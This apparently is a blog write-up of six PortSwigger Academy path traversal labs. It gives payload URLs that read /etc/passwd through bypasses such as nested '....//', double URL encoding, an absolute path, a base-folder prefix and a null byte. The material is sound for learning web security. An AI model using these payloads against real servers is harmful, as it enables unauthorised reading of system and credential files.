---
title: PortSwigger - Path Traversal
date: '2024-07-09'
tags: ['PortSwigger', 'PortSwigger Labs', 'Web Security']
draft: false
summary: 
---

#### File path traversal, simple case
In this lab we check the source of the page and find the following url:

```
https://0aae00e203902c8181cc6bd200dc00f0.web-security-academy.net/image?filename=15.jpg
```

This url is being used to load an image. We can inject path traversal payload here.

```
https://0aae00e203902c8181cc6bd200dc00f0.web-security-academy.net/image?filename=../../../../../../../etc/passwd
```

#### File path traversal, traversal sequences blocked with absolute path bypass
If an application strips or blocks directory traversal sequences from the user-supplied filename, it might be possible to bypass the defense using a variety of techniques.

You might be able to use an absolute path from the filesystem root, such as `filename=/etc/passwd`, to directly reference a file without using any traversal sequences.

In this lab we used the absolute path to access the file as directory traversal `../../` was getting stripped at the backend.

```
https://0a40003d04ba83ba809de434007a00bb.web-security-academy.net/image?filename=/etc/passwd
```

#### File path traversal, traversal sequences stripped non-recursively
You might be able to use nested traversal sequences, such as `....//` or `....\/`. These revert to simple traversal sequences when the inner sequence is stripped.

The server will strip one `../` and it will leave the other `../`

We solved this lab using the following url :

```
https://0acd0074046e76c58040357a00c100b4.web-security-academy.net/image?filename=....//....//....//etc/passwd
```

#### File path traversal, traversal sequences stripped with superfluous URL-decode
In some cases web servers strip all kind of path traversals. These can be bypassed using
- Url encoding :  `%2e%2e%2f`
- Double url encoding the `../` characters : `%252e%252e%252f`
- Various non-standard encodings, such as `..%c0%af` or `..%ef%bc%8f`, may also work.

In this case the second method worked

```
https://0a6800b704219f5280b362ee00430070.web-security-academy.net/image?filename=..%252f..%252f..%252fetc/passwd
```

#### File path traversal, validation of start of path
An application may require the user-supplied filename to start with the expected base folder, such as `/var/www/images`. In this case, it might be possible to include the required base folder followed by suitable traversal sequences. For example: `filename=/var/www/images/../../../etc/passwd`.


```
https://0a81002a03dc4624810afcda006f00a3.web-security-academy.net/image?filename=/var/www/images/../../../etc/passwd
```

#### File path traversal, validation of file extension with null byte bypass
An application may require the user-supplied filename to end with an expected file extension, such as `.png`. In this case, it might be possible to use a null byte to effectively terminate the file path before the required extension. For example: `filename=../../../etc/passwd%00.png`.

```
https://0a58008b046d8bd880bd3054006f00bf.web-security-academy.net/image?filename=../../../etc/passwd%00.png
```

